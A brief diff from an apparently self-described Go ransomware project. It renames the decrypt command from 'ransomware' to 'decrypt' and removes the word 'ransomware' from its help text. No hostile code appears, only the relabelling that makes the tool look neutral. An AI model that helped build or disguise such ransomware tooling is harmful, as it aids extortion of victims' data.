@@ -9,9 +9,9 @@ import (
 )
 
 var decryptCmd = &cobra.Command{
-	Use:   "ransomware",
-	Short: "GoLang Ransomware Decrypt function",
-	Long:  `A simple Ransomware Decrypt functionality built with GoLang.`,
+	Use:   "decrypt",
+	Short: "Decrypt functionality",
+	Long:  `Decrypt functionality built with GoLang.`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// control
 		decryptControl := make(chan struct{}, 10)
